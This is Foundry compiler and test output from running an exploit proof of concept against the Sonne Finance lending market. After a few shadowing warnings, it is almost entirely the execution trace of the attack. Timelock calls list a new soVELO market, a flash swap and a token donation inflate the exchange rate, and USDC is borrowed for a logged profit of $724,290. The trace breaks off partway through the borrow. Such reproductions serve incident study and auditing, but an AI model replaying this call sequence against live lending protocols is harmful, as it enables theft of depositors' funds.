Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.22s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-05/Sonne_exp.sol:42:5:
   |
42 |     address USDC =  0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 266.59ms (112.07Вµs CPU time)

Ran 1 test for src/test/2024-05/Sonne_exp.sol:ContractTest
[PASS] testExploit() (gas: 1206417)
Logs:
  Amount of VELO OF soVELO after minting 400000001
  Amount of soVELO been mint 2
  Amount of VELO OF soVELO after tranfer 35469150965253049864450449
  usdc_amount_after_borrow 768947220961
  Velo_amount_of_Attacker_after_redeem 35469150965253049864450448
  ---------------------------------------------------
  USDC Profit from this attack: $ 724290
  ---------------------------------------------------

Traces:
  [1260217] ContractTest::testExploit()
    в”њв”Ђ [85500] 0x37fF10390F22fABDc2137E428A6E6965960D60b6::execute(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 0, 0xfca7820b0000000000000000000000000000000000000000000000000429d069189e0000, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c)
    в”‚   в”њв”Ђ [70000] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::_setReserveFactor(300000000000000000 [3e17])
    в”‚   в”‚   в”њв”Ђ [2563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”њв”Ђ [7229] 0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E::getBorrowRate(0, 0, 0) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000002f40535f
    в”‚   в”‚   в”њв”Ђ emit AccrueInterest(cashPrior: 0, interestAccumulated: 0, borrowIndex: 1000297555174815052 [1e18], totalBorrows: 0)
    в”‚   в”‚   в”њв”Ђ emit NewReserveFactor(oldReserveFactorMantissa: 0, newReserveFactorMantissa: 300000000000000000 [3e17])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ  emit topic 0: 0xc2617efa69bab66782fa219543714338489c4e9e178271560a91b82c3f612b58
    в”‚   в”‚        topic 1: 0x9335d83fd2c1d9008f590541659249f2ae6d06ae51a85edf3eea1da0067922f7
    в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚           data: 0x000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024fca7820b0000000000000000000000000000000000000000000000000429d069189e000000000000000000000000000000000000000000000000000000000000
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [14397] 0x37fF10390F22fABDc2137E428A6E6965960D60b6::execute(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 0, 0xf2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42)
    в”‚   в”њв”Ђ [3397] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::_setInterestRateModel(0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E)
    в”‚   в”‚   в”њв”Ђ [291] 0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E::isInterestRateModel() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    в”‚   в”‚   в”њв”Ђ emit NewMarketInterestRateModel(oldInterestRateModel: 0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E, newInterestRateModel: 0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E)
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ  emit topic 0: 0xc2617efa69bab66782fa219543714338489c4e9e178271560a91b82c3f612b58
    в”‚   в”‚        topic 1: 0xadd3d68a29000218b77c3733db66b9d8e041e2c5a883d483d12f8888865d147b
    в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚           data: 0x000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024f2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e00000000000000000000000000000000000000000000000000000000
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [27842] 0x37fF10390F22fABDc2137E428A6E6965960D60b6::execute(0x60CF091cD3f50420d50fD7f707414d0DF4751C58, 0, 0x55ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd)
    в”‚   в”њв”Ђ [14342] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::_setPriceOracle(0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea)
    в”‚   в”‚   в”њв”Ђ [9153] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::_setPriceOracle(0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ emit NewPriceOracle(oldPriceOracle: 0x3176fA5060033a5d781b29De50D4A0f9E3d14F8F, newPriceOracle: 0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea)
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ  emit topic 0: 0xc2617efa69bab66782fa219543714338489c4e9e178271560a91b82c3f612b58
    в”‚   в”‚        topic 1: 0x143bf42140340b31637567dc86601a9c0c934d0dc133347f2221af060a18e0c4
    в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚           data: 0x00000000000000000000000060cf091cd3f50420d50fd7f707414d0df4751c5800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000002455ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea00000000000000000000000000000000000000000000000000000000
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [144582] 0x37fF10390F22fABDc2137E428A6E6965960D60b6::execute(0x60CF091cD3f50420d50fD7f707414d0DF4751C58, 0, 0xa76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b)
    в”‚   в”њв”Ђ [133582] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::_supportMarket(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5)
    в”‚   в”‚   в”њв”Ђ [132893] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::_supportMarket(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ [333] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::isCToken() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ emit MarketListed(rToken: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5)
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ  emit topic 0: 0xc2617efa69bab66782fa219543714338489c4e9e178271560a91b82c3f612b58
    в”‚   в”‚        topic 1: 0xe437c90721c0e6e17369a5e368d55200fc79e4521a410ec2471327c922958082
    в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚           data: 0x00000000000000000000000060cf091cd3f50420d50fd7f707414d0df4751c58000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024a76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000000000000
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [73092] 0x37fF10390F22fABDc2137E428A6E6965960D60b6::execute(0x60CF091cD3f50420d50fD7f707414d0DF4751C58, 0, 0xe4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db732547630000, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed)
    в”‚   в”њв”Ђ [61814] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::_setCollateralFactor(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 350000000000000000 [3.5e17])
    в”‚   в”‚   в”њв”Ђ [61109] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::_setCollateralFactor(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 350000000000000000 [3.5e17]) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ [35336] 0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea::getUnderlyingPrice(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3309] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "soVELO"
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5595] 0x0f2Ed59657e391746C1a097BDa98F2aBb94b1120::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [253] 0x381FA26795F866c7FE760C0cca682f0f2563ad56::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11235] 0x0f2Ed59657e391746C1a097BDa98F2aBb94b1120::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7502] 0x381FA26795F866c7FE760C0cca682f0f2563ad56::latestRoundData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2294, 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 2294
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18446744073709553910 [1.844e19], 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 18446744073709553910 [1.844e19]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 124601260000000000 [1.246e17]
    в”‚   в”‚   в”‚   в”њв”Ђ emit NewCollateralFactor(rToken: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, oldCollateralFactorMantissa: 0, newCollateralFactorMantissa: 350000000000000000 [3.5e17])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ  emit topic 0: 0xc2617efa69bab66782fa219543714338489c4e9e178271560a91b82c3f612b58
    в”‚   в”‚        topic 1: 0x638bb6cc2a01015dbf6efe0eeaae2a728d324fb9b527bdf2ef946aaf05499052
    в”‚   в”‚        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚           data: 0x00000000000000000000000060cf091cd3f50420d50fd7f707414d0df4751c58000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000044e4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db73254763000000000000000000000000000000000000000000000000000000000000
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [24673] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::approve(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [868066] 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5::swap(0, 35469150965253049864450449 [3.546e25], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01)
    в”‚   в”њв”Ђ [865367] 0x95885Af5492195F0754bE71AD1545Fe81364E531::swap(0, 35469150965253049864450449 [3.546e25], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01) [delegatecall]
    в”‚   в”‚   в”њв”Ђ [2399] 0xF1046053aa5682b4F9a81b5481394DA16BE5FF5a::isPaused() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [29794] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450449 [3.546e25])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 35469150965253049864450449 [3.546e25])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [724056] ContractTest::hook(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 35469150965253049864450449 [3.546e25], 0x01)
    в”‚   в”‚   в”‚   в”њв”Ђ [174532] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::mint(400000001 [4e8])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [88943] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::mintAllowed(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [88242] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::mintAllowed(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [39247] 0x493f11252dD0eAc438C512c801F331Fda42C9402::notifySupplyIndex(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [32001] 0x9117ECd2da25fE1C62C989ed7DC3353a89389b6A::notifySupplyIndex(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2642] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DistributedSupplierComp(param0: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1000000000000000000000000000000000000 [1e36])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8623] 0x493f11252dD0eAc438C512c801F331Fda42C9402::notifySupplier(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7895] 0x9117ECd2da25fE1C62C989ed7DC3353a89389b6A::notifySupplier(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [642] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23543] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 400000001 [4e8])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, value: 400000001 [4e8])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 400000001 [4e8]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 400000001 [4e8], mintTokens: 2)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3459] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::mintVerify(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8], 2)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2825] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::mintVerify(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8], 2) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 400000001 [4e8]
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("Amount of VELO OF soVELO after minting", 400000001 [4e8]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [642] 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("Amount of soVELO been mint", 2) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35469150965253049464450448 [3.546e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [3094] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::transfer(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 35469150965253049464450448 [3.546e25])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, value: 35469150965253049464450448 [3.546e25])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [563] 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db::balanceOf(0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35469150965253049864450449 [3.546e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [0] console::log("Amount of VELO OF soVELO after tranfer", 35469150965253049864450449 [3.546e25]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [119916] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::enterMarkets([0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [119182] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::enterMarkets([0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit MarketEntered(rToken: 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit MarketEntered(rToken: 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [0, 0]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [0, 0]
    в”‚   в”‚   в”‚   в”њв”Ђ [289677] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::borrow(768947220961 [7.689e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2585] 0x7F5c764cBc14f9669B88837ca1490cCa17c31607::balanceOf(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1046005468588 [1.046e12]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11103] 0xbbbd75383f6A61d5EB5b43e94E6372Df6F7f13c6::getBorrowRate(1046005468588 [1.046e12], 4788816651334 [4.788e12], 1342598213 [1.342e9]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000000000000947914da
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit AccrueInterest(cashPrior: 1046005468588 [1.046e12], interestAccumulated: 3769490 [3.769e6], borrowIndex: 1131576108522846970 [1.131e18], totalBorrows: 4788820420824 [4.788e12])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [149629] 0x60CF091cD3f50420d50fD7f707414d0DF4751C58::borrowAllowed(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 768947220961 [7.689e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [148928] 0xE8FF1489227fa74f77E49C688903e69E1583C03f::borrowAllowed(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 768947220961 [7.689e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [35470] 0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea::getUnderlyingPrice(0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3309] 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "soUSDC"
